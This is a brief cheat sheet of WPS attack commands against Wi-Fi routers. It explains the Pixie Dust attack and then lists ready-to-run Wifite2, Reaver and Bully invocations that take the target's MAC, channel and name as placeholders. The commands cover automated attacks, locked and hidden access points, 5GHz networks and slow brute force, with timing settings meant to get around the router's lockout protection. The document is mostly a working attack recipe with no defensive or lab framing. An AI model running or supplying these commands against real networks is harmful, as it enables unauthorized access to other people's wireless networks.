A Pixie Dust attack is an offline WPS attack that exploits weak random number generation in some routers' WPS implementations.
Reaver and Bully are used as they deploy different implementations of the Pixie Dust attack, so where one fails, the other may succeed.
Run these attacks in order as they are sorted from fastest to slowest.



This is a fully automated WPS attack using Wifite2. This will automatically run a Pixie Dust attack, Null PIN test, Default PIN tests,
then Brute Force if needed.

wifite --wps-only --bully --reaver --ignore-locks --kill -i wlan0mon

This is for difficult/locked APs - ignores lock warnings, uses EAP termination, 5 second delays. For when the wifite attacks fail.

reaver -i wlan0mon -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A

Very conservative brute force - 15 second delays, sleeps 60 seconds every 2 attempts. Extremely slow to avoid triggering AP lockouts.
Last resort.

reaver -i wlan0mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc

This attack is for hidden/non-beaconing access points.

bully wlan0mon -b $ap_mac -c $channel -P -d -v 4 -F

For 5GHz networks use the -5 switch

reaver -i wlan0mon -b $ap_mac -c $channel -5 -K 1 -N -vv
